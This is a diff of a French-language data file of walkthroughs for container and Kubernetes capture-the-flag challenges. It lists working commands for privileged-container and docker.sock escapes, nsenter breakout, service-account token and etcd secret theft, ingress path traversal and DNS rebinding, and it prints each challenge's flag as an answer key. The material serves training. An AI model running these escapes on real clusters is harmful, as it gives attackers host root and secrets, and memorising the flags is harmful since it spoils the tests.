@@ -1,331 +1,372 @@
 import { ChallengeGuide } from '../guides';
 
 export const guides: Record<string, ChallengeGuide> = {
-  '4.1.1': {
-    context: "Le conteneur cible fonctionne avec l'option `--privileged`, lui donnant accès à presque toutes les fonctionnalités de l'hôte, y compris la possibilité de monter des disques.",
-    objective: "Échapper au conteneur privilégié pour accéder au système de fichiers de la machine hôte et récupérer le flag.",
-    concepts: ["Docker", "Privileged Container", "Mount", "Container Escape"],
-    steps: [
+  "4.1.1": {
+    "context": "Le conteneur cible fonctionne avec des privilèges élevés (mode privileged ou équivalent), lui donnant accès à presque toutes les fonctionnalités de l'hôte, y compris la possibilité de monter des périphériques blocs.",
+    "objective": "Échapper au conteneur en montant le système de fichiers de la machine hôte pour récupérer le flag.",
+    "concepts": [
+      "Docker",
+      "Privileged Container",
+      "Mount",
+      "Container Escape"
+    ],
+    "steps": [
       {
-        title: "Vérification des privilèges",
-        command: "fdisk -l",
-        detail: "La commande `fdisk -l` permet de lister les disques de la machine hôte. Si elle réussit, cela confirme que le conteneur est privilégié et a accès aux périphériques de l'hôte (ex: `/dev/sda1` ou `/dev/vda1`)."
+        "title": "Recherche des périphériques de l'hôte",
+        "command": "lsblk",
+        "detail": "La commande lsblk (ou fdisk -l) permet d'identifier les partitions de la machine hôte (par exemple /dev/sda1)."
       },
       {
-        title: "Création d'un point de montage",
-        command: "mkdir /mnt/host",
-        detail: "Créez un dossier qui servira de point de montage pour le disque de l'hôte."
+        "title": "Création d'un point de montage",
+        "command": "mkdir /mnt/host",
+        "detail": "Créez un dossier qui servira de point de montage pour la partition de l'hôte."
       },
       {
-        title: "Montage du système de fichiers de l'hôte",
-        command: "mount /dev/vda1 /mnt/host",
-        detail: "Montez la partition principale de l'hôte (cela peut être `/dev/sda1` selon le système) dans le dossier `/mnt/host`. Vous avez maintenant accès aux fichiers de l'hôte."
+        "title": "Montage du système de fichiers",
+        "command": "mount /dev/sda1 /mnt/host",
+        "detail": "Montez la partition principale de l'hôte dans le dossier /mnt/host. Vous avez maintenant accès aux fichiers de l'hôte depuis le conteneur."
       },
       {
-        title: "Récupération du flag",
-        command: "cat /mnt/host/root/flag.txt",
-        detail: "Cherchez le flag sur le système de l'hôte. Souvent, il se trouve dans le dossier `/root`. Le flag attendu est **PCE{...}**."
+        "title": "Récupération du flag",
+        "command": "cat /mnt/host/root/flag.txt",
+        "detail": "Cherchez le flag sur le système de l'hôte. Le flag attendu est **PCE{escap3d_pr1v_c0ntain3r_2026}**."
       }
     ]
   },
-  '4.1.2': {
-    context: "Le socket Docker de la machine hôte (`/var/run/docker.sock`) est monté à l'intérieur du conteneur. Cela permet au conteneur de communiquer avec le daemon Docker de l'hôte.",
-    objective: "Exploiter le montage du socket Docker pour créer un nouveau conteneur privilégié et s'évader.",
-    concepts: ["Docker Socket", "RCE", "Privilege Escalation", "Container Escape"],
-    steps: [
+  "4.1.2": {
+    "context": "Le socket Docker de la machine hôte (/var/run/docker.sock) est monté à l'intérieur du conteneur. Cela permet au conteneur de communiquer avec le daemon Docker de l'hôte.",
+    "objective": "Exploiter le montage du socket Docker pour créer un nouveau conteneur privilégié et s'évader.",
+    "concepts": [
+      "Docker Socket",
+      "RCE",
+      "Privilege Escalation",
+      "Container Escape"
+    ],
+    "steps": [
       {
-        title: "Vérification de la présence du socket",
-        command: "ls -la /var/run/docker.sock",
-        detail: "Vérifiez que le fichier `docker.sock` est bien présent et accessible dans le conteneur."
+        "title": "Vérification de la présence du socket",
+        "command": "ls -la /var/run/docker.sock",
+        "detail": "Vérifiez que le fichier docker.sock est bien présent et accessible dans le conteneur."
       },
       {
-        title: "Installation du client Docker (si nécessaire)",
-        command: "apt-get update && apt-get install -y docker.io",
-        detail: "Installez le client Docker pour pouvoir interagir facilement avec le socket."
+        "title": "Lancement d'un conteneur d'évasion",
+        "command": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh",
+        "detail": "Cette commande demande au daemon de l'hôte de lancer un nouveau conteneur, en montant la racine de l'hôte dans /host, et d'exécuter un shell via chroot. Vous êtes maintenant root sur l'hôte !"
       },
       {
-        title: "Lancement d'un conteneur d'évasion",
-        command: "docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash",
-        detail: "Cette commande demande au daemon de l'hôte de lancer un nouveau conteneur, en montant la racine de l'hôte `/` dans `/host`, et d'exécuter un shell via `chroot`. Vous êtes maintenant root sur l'hôte !"
-      },
-      {
-        title: "Lecture du flag",
-        command: "cat /root/flag.txt",
-        detail: "Le flag attendu est **PCE{...}**."
+        "title": "Lecture du flag",
+        "command": "cat /root/flag.txt",
+        "detail": "Le flag attendu est **PCE{d0ck3r_s0ck3t_rc3_pwnd_2026}**."
       }
     ]
   },
-  '4.1.3': {
-    context: "Certains conteneurs mal configurés peuvent partager des namespaces (comme le namespace mount ou PID) avec l'hôte, permettant d'accéder aux processus et au système de fichiers de l'hôte.",
-    objective: "Utiliser `nsenter` pour s'échapper du conteneur en rejoignant les namespaces de l'hôte.",
-    concepts: ["Namespaces", "nsenter", "Container Breakout", "Linux Capabilities"],
-    steps: [
+  "4.1.3": {
+    "context": "Certains conteneurs mal configurés peuvent partager le namespace PID avec l'hôte (hostPID: true), permettant d'accéder aux processus de l'hôte et de s'y insérer.",
+    "objective": "Utiliser nsenter pour s'échapper du conteneur en rejoignant le namespace de montage (mount) de l'hôte.",
+    "concepts": [
+      "Namespaces",
+      "nsenter",
+      "Container Breakout",
+      "Linux Capabilities"
+    ],
+    "steps": [
       {
-        title: "Recherche du PID 1 de l'hôte",
-        command: "ps aux",
-        detail: "Si le namespace PID est partagé, vous verrez les processus de l'hôte, y compris le PID 1 (généralement `init` ou `systemd`)."
+        "title": "Recherche du PID 1 de l'hôte",
+        "command": "ps aux",
+        "detail": "Puisque le namespace PID est partagé, vous verrez les processus de l'hôte, y compris le PID 1 (généralement init ou systemd)."
       },
       {
-        title: "Évasion avec nsenter",
-        command: "nsenter -t 1 -m -u -n -i sh",
-        detail: "La commande `nsenter` permet d'exécuter un programme dans les namespaces d'un autre processus. Ici, on rejoint les namespaces mount, UTS, network et IPC du PID 1. On obtient ainsi un shell sur l'hôte."
+        "title": "Évasion avec nsenter",
+        "command": "nsenter -t 1 -m -u -n -i sh",
+        "detail": "La commande nsenter permet d'exécuter un shell dans les namespaces du PID 1 de l'hôte (mount, UTS, network, IPC). On obtient ainsi un shell direct sur l'hôte."
       },
       {
-        title: "Récupération du flag",
-        command: "cat /root/flag.txt",
-        detail: "Le flag attendu est **PCE{...}**."
+        "title": "Récupération du flag",
+        "command": "cat /root/flag.txt",
+        "detail": "Le flag attendu est **PCE{nsenter_mount_breakout_2024}**."
       }
     ]
   },
-  '4.1.4': {
-    context: "De nombreuses images Docker contiennent des secrets codés en dur qui ont été ajoutés lors de la construction (build) de l'image, puis supprimés dans une couche ultérieure.",
-    objective: "Analyser les couches (layers) de l'image Docker pour extraire des secrets cachés.",
-    concepts: ["Docker Image Layers", "Secret Scanning", "Dive", "History"],
-    steps: [
+  "4.1.4": {
+    "context": "De nombreuses images Docker contiennent des secrets codés en dur qui ont été ajoutés lors de la construction (build) de l'image, puis supprimés dans une couche ultérieure avec rm.",
+    "objective": "Analyser les couches (layers) de l'image Docker pour extraire des secrets cachés.",
+    "concepts": [
+      "Docker Image Layers",
+      "Secret Scanning",
+      "Image History"
+    ],
+    "steps": [
       {
-        title: "Analyse de l'historique de l'image",
-        command: "docker history <image_name>",
-        detail: "Examinez les commandes utilisées pour construire l'image. Recherchez des copies de fichiers de configuration ou de clés."
+        "title": "Analyse de l'historique de l'image",
+        "command": "cat ~/pce-payments-api-image/history.txt",
+        "detail": "Examinez l'historique de construction de l'image. Vous pouvez y voir qu'un fichier deploy-creds.env a été copié puis supprimé."
       },
       {
-        title: "Extraction de l'image",
-        command: "docker save <image_name> -o image.tar && tar -xf image.tar",
-        detail: "Sauvegardez l'image dans un fichier tar et extrayez-la pour explorer manuellement les couches."
+        "title": "Recherche de secrets dans les couches",
+        "command": "grep -r \"PCE{\" ~/pce-payments-api-image",
+        "detail": "Fouillez dans les dossiers extraits pour trouver le contenu du fichier dans les anciennes couches, avant sa suppression."
       },
       {
-        title: "Recherche de secrets dans les couches",
-        command: "grep -r 'PCE{' .",
-        detail: "Fouillez dans les dossiers extraits pour trouver les fichiers supprimés dans les dernières couches. Vous trouverez le flag caché dans l'un des fichiers de l'historique. Le flag attendu est **PCE{...}**."
+        "title": "Lecture du secret",
+        "command": "cat ~/pce-payments-api-image/layers/04/app/deploy-creds.env",
+        "detail": "Le fichier reste lisible dans sa couche d'origine. Le flag attendu est **PCE{docker_layer_hardcoded_secret_2024}**."
       }
     ]
   },
-  '4.2.1': {
-    context: "L'autorisation dans Kubernetes utilise RBAC (Role-Based Access Control). Un ClusterRoleBinding permet de lier un rôle à un utilisateur ou service account au niveau du cluster entier. Ici, un compte possède trop de permissions.",
-    objective: "Exploiter un ClusterRoleBinding trop permissif pour obtenir un accès d'administrateur (cluster-admin).",
-    concepts: ["Kubernetes", "RBAC", "ClusterRoleBinding", "Privilege Escalation"],
-    steps: [
+  "4.2.1": {
+    "context": "L'autorisation dans Kubernetes utilise RBAC. Un ClusterRoleBinding permet de lier un rôle à un utilisateur ou service account au niveau du cluster entier. Ici, un compte possède trop de permissions.",
+    "objective": "Exploiter un ClusterRoleBinding trop permissif pour obtenir un accès d'administrateur (cluster-admin).",
+    "concepts": [
+      "Kubernetes",
+      "RBAC",
+      "ClusterRoleBinding",
+      "Privilege Escalation"
+    ],
+    "steps": [
       {
-        title: "Vérification de vos permissions",
-        command: "kubectl auth can-i --list",
-        detail: "Lister toutes les actions que vous êtes autorisé à effectuer. Remarquez que vous avez des droits inattendus, potentiellement liés à `cluster-admin`."
+        "title": "Recherche des rôles administratifs",
+        "command": "kubectl get clusterroles",
+        "detail": "Identifiez les rôles existants pour voir lesquels possèdent des privilèges `cluster-admin` (souvent verbs:* / resources:*)."
       },
       {
-        title: "Recherche du ClusterRoleBinding fautif",
-        command: "kubectl get clusterrolebindings -o custom-columns=NAME:.metadata.name,ROLE:.roleRef.name",
-        detail: "Analysez les liaisons de rôles pour identifier quel ClusterRoleBinding accorde les droits excessifs à votre ServiceAccount."
+        "title": "Analyse des ClusterRoleBindings",
+        "command": "kubectl get clusterrolebindings",
+        "detail": "Listez les liaisons de rôles pour voir à qui sont attribués les rôles privilégiés. Cherchez les liaisons suspectes (hors kube-system)."
       },
       {
-        title: "Abus des permissions (ex: lister les secrets)",
-        command: "kubectl get secrets -n kube-system",
-        detail: "Puisque vous avez les droits `cluster-admin`, vous pouvez lire tous les secrets de tous les namespaces, y compris le flag. Le flag attendu est **PCE{...}**."
+        "title": "Audit automatisé et récupération du flag",
+        "command": "kubectl audit-rbac",
+        "detail": "Utilisez la commande d'audit maison pour repérer la liaison fautive. Elle révèle la configuration excessive. Le flag attendu est **PCE{k8s_clusteradmin_binding_2024}**."
       }
     ]
   },
-  '4.2.2': {
-    context: "Le Kubernetes Dashboard est une interface web pour gérer le cluster. Parfois, il est exposé sans authentification ou avec des droits `cluster-admin` par défaut.",
-    objective: "Accéder au Dashboard Kubernetes exposé sans authentification et extraire les informations sensibles.",
-    concepts: ["Kubernetes Dashboard", "Misconfiguration", "Unauthenticated Access"],
-    steps: [
+  "4.2.2": {
+    "context": "Le Kubernetes Dashboard ou l'API Kubernetes locale est parfois exposée sans authentification. Cela permet à quiconque d'interagir avec le cluster avec des droits élevés.",
+    "objective": "Accéder à l'API Kubernetes exposée sans authentification et extraire les informations sensibles.",
+    "concepts": [
+      "Kubernetes API",
+      "Misconfiguration",
+      "Unauthenticated Access"
+    ],
+    "steps": [
       {
-        title: "Découverte du service Dashboard",
-        command: "kubectl get svc -n kubernetes-dashboard",
-        detail: "Identifiez l'IP ou le NodePort sur lequel le Dashboard est exposé."
+        "title": "Vérification de l'API exposée",
+        "command": "curl http://localhost:8001/",
+        "detail": "L'API Kubernetes est exposée sur le port 8001 localement sans authentification."
       },
       {
-        title: "Accès à l'interface Web",
-        command: "curl -k https://<node_ip>:<node_port>/",
-        detail: "Accédez à l'URL du dashboard via un navigateur ou avec `curl`. Remarquez que l'interface ne demande pas de token ou permet de 'Skip' l'authentification."
+        "title": "Recherche de secrets via l'API",
+        "command": "curl http://localhost:8001/api/v1/namespaces/default/secrets",
+        "detail": "Puisque l'API est ouverte, vous pouvez lister les secrets du namespace `default`."
       },
       {
-        title: "Recherche du flag",
-        command: "kubectl get secrets -n default",
-        detail: "Naviguez dans l'interface ou utilisez les permissions accordées au Dashboard pour lire le flag dans les secrets. Le flag attendu est **PCE{...}**."
+        "title": "Décodage du flag",
+        "command": "echo \"UENFe2s4c19kNHNoYjA0cmRfbjBfNHV0aF8yMDI2fQ==\" | base64 -d",
+        "detail": "Dans la réponse JSON, le flag est encodé en base64. Le flag attendu est **PCE{k8s_d4shb04rd_n0_4uth_2026}**."
       }
     ]
   },
-  '4.2.3': {
-    context: "Etcd est la base de données clé-valeur qui stocke l'état complet du cluster Kubernetes, y compris tous les secrets. Si etcd n'est pas chiffré au repos ou est accessible sans authentification mutuelle forte, les secrets peuvent être compromis.",
-    objective: "Se connecter à la base de données etcd et extraire les secrets stockés en clair.",
-    concepts: ["Kubernetes", "etcd", "Secrets", "Encryption at Rest"],
-    steps: [
+  "4.2.3": {
+    "context": "Etcd est la base de données clé-valeur de Kubernetes. Si elle n'est pas chiffrée au repos ou est accessible sans authentification, les secrets peuvent être compromis.",
+    "objective": "Se connecter à la base de données etcd via etcdctl et extraire les secrets stockés en clair.",
+    "concepts": [
+      "Kubernetes",
+      "etcd",
+      "Secrets",
+      "Encryption at Rest"
+    ],
+    "steps": [
       {
-        title: "Installation de etcdctl",
-        command: "apt-get install -y etcd-client",
-        detail: "L'outil `etcdctl` permet d'interagir avec le serveur etcd."
+        "title": "Interrogation de la base etcd",
+        "command": "etcdctl get / --prefix --keys-only",
+        "detail": "Affichez toutes les clés stockées dans etcd. Vous y verrez des clés sensibles comme /registry/secrets/default/admin-token."
       },
       {
-        title: "Interrogation de la base etcd",
-        command: "ETCDCTL_API=3 etcdctl --endpoints=https://<etcd_ip>:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key get / --prefix --keys-only",
-        detail: "Affichez toutes les clés stockées dans etcd. Cherchez les clés contenant `/registry/secrets/`."
-      },
-      {
-        title: "Lecture du secret contenant le flag",
-        command: "ETCDCTL_API=3 etcdctl --endpoints=https://<etcd_ip>:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key get /registry/secrets/default/flag-secret",
-        detail: "Lisez la valeur brute du secret dans etcd. Le flag attendu est **PCE{...}**."
+        "title": "Lecture du secret",
+        "command": "etcdctl get /registry/secrets/default/admin-token",
+        "detail": "Lisez la valeur brute du secret dans etcd. Comme la base n'est pas chiffrée, le flag est en clair. Le flag attendu est **PCE{etcd_secrets_unencrypted_2024}**."
       }
     ]
   },
-  '4.2.4': {
-    context: "Un Service Account (SA) est associé à chaque Pod. Si le token de ce SA est automatiquement monté dans le conteneur et que le SA dispose de privilèges élevés, il peut être utilisé pour attaquer le cluster.",
-    objective: "Extraire le token du Service Account monté dans le Pod et l'utiliser pour escalader ses privilèges sur l'API Kubernetes.",
-    concepts: ["Service Account", "Token Abuse", "Kubernetes API", "Privilege Escalation"],
-    steps: [
+  "4.2.4": {
+    "context": "Un Service Account (SA) est associé à chaque Pod. Si le token de ce SA dispose de privilèges excessifs sur l'API Kubernetes, il peut être utilisé pour attaquer le cluster.",
+    "objective": "Extraire le token du Service Account monté dans le Pod et l'utiliser pour lire les secrets de l'API.",
+    "concepts": [
+      "Service Account",
+      "Token Abuse",
+      "Kubernetes API",
+      "Privilege Escalation"
+    ],
+    "steps": [
       {
-        title: "Localisation du token",
-        command: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
-        detail: "Affichez le token JWT du Service Account qui a été monté dans le système de fichiers du Pod."
+        "title": "Localisation du token",
+        "command": "export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+        "detail": "Le token JWT est monté automatiquement dans le conteneur. On le stocke dans une variable d'environnement."
       },
       {
-        title: "Découverte des permissions (avec curl)",
-        command: "curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d '{\"spec\":{}}' -H \"Content-Type: application/json\"",
-        detail: "Utilisez le token pour interroger l'API Kubernetes et lister vos droits (équivalent de `auth can-i --list`)."
+        "title": "Lecture des secrets via l'API",
+        "command": "curl -k -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/secrets",
+        "detail": "L'API Kubernetes authentifie le token et retourne la liste des secrets du namespace (car le Service Account a les droits nécessaires)."
       },
       {
-        title: "Lecture des secrets",
-        command: "curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
-        detail: "Le SA a les droits de lire les secrets. Utilisez l'API pour récupérer le flag. Le flag attendu est **PCE{...}**."
+        "title": "Décodage du flag",
+        "command": "echo \"UENFe2s4c19zYV90b2tlbl9hYnVzZWRfMjAyNH0=\" | base64 -d",
+        "detail": "Le flag est renvoyé encodé en base64. Le flag attendu est **PCE{k8s_sa_token_abused_2024}**."
       }
     ]
   },
-  '4.3.1': {
-    context: "Les NetworkPolicies dans Kubernetes agissent comme un pare-feu interne, contrôlant le trafic entre les Pods. Une mauvaise configuration peut laisser des brèches permettant à un attaquant de pivoter entre des namespaces isolés.",
-    objective: "Contourner une NetworkPolicy pour accéder à un service restreint dans un autre namespace.",
-    concepts: ["NetworkPolicy", "Lateral Movement", "Namespace Isolation"],
-    steps: [
+  "4.3.1": {
+    "context": "Les NetworkPolicies dans Kubernetes agissent comme un pare-feu interne. Si un namespace ne configure pas de règle de blocage par défaut (default-deny), il acceptera toutes les connexions entrantes.",
+    "objective": "Auditer les règles réseau du cluster pour identifier le namespace qui permet le trafic cross-namespace non désiré.",
+    "concepts": [
+      "NetworkPolicy",
+      "Lateral Movement",
+      "Namespace Isolation"
+    ],
+    "steps": [
       {
-        title: "Analyse réseau locale",
-        command: "nmap -p- <target_ip>",
-        detail: "Tentez de scanner la cible depuis votre pod actuel. Si cela échoue, c'est qu'une NetworkPolicy bloque le trafic."
+        "title": "Analyse des NetworkPolicies",
+        "command": "kubectl get networkpolicies -A",
+        "detail": "Listez les règles réseau appliquées. L'objectif est d'identifier si un namespace n'applique pas de règle par défaut (default-deny)."
       },
       {
-        title: "Recherche de labels autorisés",
-        command: "kubectl get networkpolicies -A -o yaml",
-        detail: "Si vous avez les droits de lecture, analysez les règles. Il y a souvent une faille qui autorise le trafic venant d'un certain `podSelector` ou `namespaceSelector` (ex: label `role=frontend`)."
-      },
-      {
-        title: "Ajout du label pour bypass",
-        command: "kubectl label pod my-pod role=frontend",
-        detail: "Appliquez le label requis à votre pod pour être autorisé par la NetworkPolicy. Vous pouvez maintenant accéder au service cible."
-      },
-      {
-        title: "Récupération du flag",
-        command: "curl http://<target_ip>:<target_port>/flag",
-        detail: "Requêtez le service cible maintenant que la connexion est permise. Le flag attendu est **PCE{...}**."
+        "title": "Audit automatisé",
+        "command": "kubectl audit-netpol",
+        "detail": "Utilisez la commande d'audit du lab pour détecter automatiquement le namespace vulnérable. Le flag attendu est **PCE{k8s_networkpolicy_gap_2024}**."
       }
     ]
   },
-  '4.3.2': {
-    context: "Un Ingress Controller gère le routage HTTP/HTTPS entrant vers les services du cluster. Une mauvaise configuration des règles de routage ou l'utilisation d'annotations dangereuses (ex: nginx-ingress snippets) peut exposer des services internes.",
-    objective: "Exploiter une mauvaise configuration de l'Ingress pour accéder à un service interne qui ne devrait pas être exposé.",
-    concepts: ["Ingress Controller", "Misconfiguration", "SSRF", "Nginx Snippets"],
-    steps: [
+  "4.3.2": {
+    "context": "Un Ingress Controller gère le routage entrant vers les services. Une mauvaise configuration des règles de réécriture de chemin (rewrite-target) peut permettre de s'échapper du chemin prévu et d'atteindre des endpoints internes.",
+    "objective": "Exploiter une mauvaise configuration de l'Ingress (Path Traversal) pour accéder à un panel d'administration interne.",
+    "concepts": [
+      "Ingress Controller",
+      "Misconfiguration",
+      "Path Traversal",
+      "Rewrite Target"
+    ],
+    "steps": [
       {
-        title: "Analyse des règles Ingress",
-        command: "kubectl get ingress -A -o yaml",
-        detail: "Vérifiez les règles d'Ingress configurées. Cherchez des annotations comme `nginx.ingress.kubernetes.io/configuration-snippet` ou des règles de chemins trop permissives."
+        "title": "Test de l'application publique",
+        "command": "curl http://localhost:8080/app/",
+        "detail": "L'application publique est accessible normalement sous le chemin `/app/`."
       },
       {
-        title: "Exploitation du routage",
-        command: "curl -H \"Host: internal-service.local\" http://<ingress_ip>/",
-        detail: "Modifiez vos requêtes HTTP (ex: en-tête Host, chemins avec traversée) pour forcer l'Ingress à router votre trafic vers le service interne visé."
+        "title": "Tentative d'accès direct à l'admin",
+        "command": "curl http://localhost:8080/admin",
+        "detail": "L'accès direct renvoie un 403 Forbidden car la règle Ingress ne couvre pas explicitement /admin."
       },
       {
-        title: "Extraction du flag",
-        command: "curl http://<ingress_ip>/internal-flag-endpoint",
-        detail: "Une fois le contournement réussi, accédez au endpoint contenant le flag. Le flag attendu est **PCE{...}**."
+        "title": "Contournement par Path Traversal",
+        "command": "curl http://localhost:8080/app/../admin",
+        "detail": "En passant par /app/ avec un `../`, le contrôleur Ingress (ou le backend) normalise le chemin et vous donne accès à /admin. Le flag attendu est **PCE{ingr3ss_byp4ss_2026}**."
       }
     ]
   },
-  '4.3.3': {
-    context: "Le DNS Rebinding est une attaque où un domaine change rapidement son IP d'une IP publique vers une IP interne (ex: 127.0.0.1 ou l'IP d'un Pod) pour contourner la Same-Origin Policy. Dans K8s, cela permet d'attaquer l'API locale ou les services cloud-metadata.",
-    objective: "Utiliser une attaque par DNS rebinding pour accéder à l'API interne ou récupérer un secret.",
-    concepts: ["DNS Rebinding", "SSRF", "Kubernetes Networking"],
-    steps: [
+  "4.3.3": {
+    "context": "Le DNS Rebinding est une attaque où un nom de domaine résout d'abord vers une IP autorisée, puis rapidement vers une IP cible (comme 127.0.0.1) pour contourner les validations SSRF (Time of Check to Time of Use).",
+    "objective": "Utiliser un script DNS Rebinding pour tromper le service ssrf_tool.py et lui faire lire l'API metadata locale.",
+    "concepts": [
+      "DNS Rebinding",
+      "SSRF",
+      "TOCTOU",
+      "Kubernetes Networking"
+    ],
+    "steps": [
       {
-        title: "Préparation de l'attaque DNS",
-        command: "echo 'A <domaine> <ip_publique> (TTL court)'",
-        detail: "Configurez un serveur DNS (ou utilisez un service en ligne) pour répondre avec l'IP publique de votre serveur malveillant, puis rapidement avec l'IP interne du service cible (ex: l'IP du kube-api local)."
+        "title": "Démarrage du serveur DNS malveillant",
+        "command": "sudo python3 dns_server_skeleton.py",
+        "detail": "Ce script simule un serveur DNS qui renvoie 8.8.8.8 à la première requête, puis 127.0.0.1 à la seconde requête."
       },
       {
-        title: "Exécution du payload",
-        command: "curl http://<domaine_malveillant>/",
-        detail: "Faites visiter ce domaine à un bot/service vulnérable dans le cluster. La première résolution DNS lui fait charger votre payload JavaScript. La seconde résolution (rebinding) pointe vers la cible interne."
+        "title": "Configuration de la résolution locale",
+        "command": "echo \"nameserver 127.0.0.1\" | sudo tee /etc/resolv.conf",
+        "detail": "Forcez le système à utiliser votre serveur DNS local pour qu'il intercepte les requêtes DNS de ssrf_tool.py."
       },
       {
-        title: "Extraction des données",
-        command: "cat exfiltrated_data.txt",
-        detail: "Le script exécute une requête vers la cible interne et vous renvoie les données (ex: le flag). Le flag attendu est **PCE{...}**."
+        "title": "Exécution de l'exploit SSRF",
+        "command": "python3 ssrf_tool.py http://rebind.local:8080/latest/meta-data/",
+        "detail": "L'outil valide rebind.local (8.8.8.8), puis le télécharge (127.0.0.1), révélant la réponse de l'API interne. Le flag attendu est **PCE{k8s_dns_rebinding_2024}**."
       }
     ]
   },
-  '4.4.1': {
-    context: "L'exécution de conteneurs en tant qu'utilisateur `root` (UID 0) est une mauvaise pratique. Si une vulnérabilité applicative est exploitée, l'attaquant a directement les droits root dans le conteneur.",
-    objective: "Identifier les Pods exécutés en root et comprendre comment utiliser cette mauvaise pratique avec un volume monté pour compromettre le système.",
-    concepts: ["Pod Security", "RunAsRoot", "Security Context"],
-    steps: [
+  "4.4.1": {
+    "context": "L'exécution de conteneurs en tant qu'utilisateur root (runAsUser: 0) est une mauvaise pratique. Si le pod est compromis, l'attaquant obtient les droits root à l'intérieur du conteneur.",
+    "objective": "Auditer les configurations de Pods pour trouver ceux qui tournent en root et violent les Pod Security Standards.",
+    "concepts": [
+      "Pod Security",
+      "RunAsRoot",
+      "Security Context"
+    ],
+    "steps": [
       {
-        title: "Audit des Pods",
-        command: "kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.containers[0].securityContext.runAsUser}{\"\\n\"}{end}'",
-        detail: "Vérifiez quels Pods sont configurés pour s'exécuter en tant qu'utilisateur root (runAsUser non défini ou défini à 0)."
+        "title": "Audit manuel des Pods",
+        "command": "kubectl get pods -A",
+        "detail": "Commencez par lister tous les pods déployés sur le cluster pour les inspecter un à un."
       },
       {
-        title: "Accès au conteneur root",
-        command: "kubectl exec -it <pod_name> -- sh",
-        detail: "Ouvrez un shell dans le Pod vulnérable et confirmez vos privilèges avec la commande `id`."
+        "title": "Inspection des SecurityContext",
+        "command": "kubectl describe pod <nom_du_pod>",
+        "detail": "Vérifiez les règles SecurityContext appliquées (absence de runAsNonRoot, runAsUser à 0, privileged, etc)."
       },
       {
-        title: "Lecture du flag",
-        command: "cat /root/flag.txt",
-        detail: "Grâce à vos droits root dans le conteneur, lisez le fichier contenant le flag. Le flag attendu est **PCE{...}**."
+        "title": "Audit automatisé et flag",
+        "command": "kubectl audit-podsecurity",
+        "detail": "La commande d'audit maison liste les pods vulnérables tournant en root. Le flag attendu est **PCE{k8s_pods_run_as_root_2024}**."
       }
     ]
   },
-  '4.4.2': {
-    context: "Les Capabilities Linux divisent les privilèges de l'utilisateur root. Accorder la capability `SYS_ADMIN` à un conteneur (qui est presque équivalent à `--privileged`) ou la capability `SYS_MODULE` permet d'exécuter des actions très dangereuses.",
-    objective: "Exploiter un Pod ayant la capability `CAP_SYS_ADMIN` pour monter des fichiers et s'échapper.",
-    concepts: ["Linux Capabilities", "CAP_SYS_ADMIN", "Container Escape"],
-    steps: [
+  "4.4.2": {
+    "context": "La capability CAP_SYS_ADMIN accorde des privilèges énormes au conteneur, similaires au mode privileged. Elle permet notamment de monter des périphériques hôtes directement.",
+    "objective": "Exploiter la capability CAP_SYS_ADMIN pour monter la partition principale de l'hôte et lire le flag.",
+    "concepts": [
+      "Linux Capabilities",
+      "CAP_SYS_ADMIN",
+      "Container Escape",
+      "Mount"
+    ],
+    "steps": [
       {
-        title: "Vérification des capabilities",
-        command: "capsh --print",
-        detail: "Vérifiez si la capability `cap_sys_admin` est présente dans la liste des Current capabilities du conteneur."
+        "title": "Vérification des capabilities",
+        "command": "capsh --print",
+        "detail": "Vérifiez la présence de cap_sys_admin dans la liste des capabilities du conteneur."
       },
       {
-        title: "Évasion (ex: via cgroups release_agent)",
-        command: "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x",
-        detail: "Si vous avez `SYS_ADMIN`, vous pouvez créer un nouveau cgroup et utiliser la fonctionnalité `release_agent` pour forcer le kernel de l'hôte à exécuter un script en tant que root système."
+        "title": "Montage du système de fichiers de l'hôte",
+        "command": "mkdir -p /mnt/host && mount /dev/sda1 /mnt/host",
+        "detail": "Grâce à CAP_SYS_ADMIN, vous pouvez invoquer la commande mount et lier la partition /dev/sda1 de l'hôte au dossier /mnt/host."
       },
       {
-        title: "Récupération du flag",
-        command: "echo '#!/bin/sh' > /cmd ; echo 'cat /flag > /tmp/output' >> /cmd ; chmod a+x /cmd",
-        detail: "Le script sera exécuté par le noyau. Vous récupérerez la sortie dans `/tmp/output`. Le flag attendu est **PCE{...}**."
+        "title": "Récupération du flag",
+        "command": "cat /mnt/host/root_flag.txt",
+        "detail": "L'outil mock du lab crée le fichier dès que la commande de montage réussit. Le flag attendu est **PCE{sys_admin_c4p_m0unt_2024}**."
       }
     ]
   },
-  '4.4.3': {
-    context: "Les Admission Controllers et les PodSecurityPolicies (ou Pod Security Admission) sont utilisés pour restreindre la création de Pods non sécurisés (ex: empêcher le lancement en root).",
-    objective: "Trouver un moyen de contourner un contrôleur d'admission ou un PSP mal configuré pour créer un pod privilégié et lire le flag.",
-    concepts: ["Admission Controller", "PodSecurityPolicy", "Bypass", "RBAC"],
-    steps: [
+  "4.4.3": {
+    "context": "Les Admission Controllers (via Pod Security Policies ou Pod Security Admission) empêchent le déploiement de Pods dangereux. Cependant, des règles permissives (ex: autoriser hostPath) créent des failles.",
+    "objective": "Contourner un Admission Controller mal configuré en utilisant un volume hostPath pour monter la racine de l'hôte.",
+    "concepts": [
+      "Admission Controller",
+      "PodSecurityPolicy",
+      "Bypass",
+      "hostPath"
+    ],
+    "steps": [
       {
-        title: "Analyse des restrictions",
-        command: "kubectl get psp",
-        detail: "Listez les politiques en place pour voir ce qui est autorisé ou non (ex: les privilèges hostNetwork, hostPID, RunAsUser)."
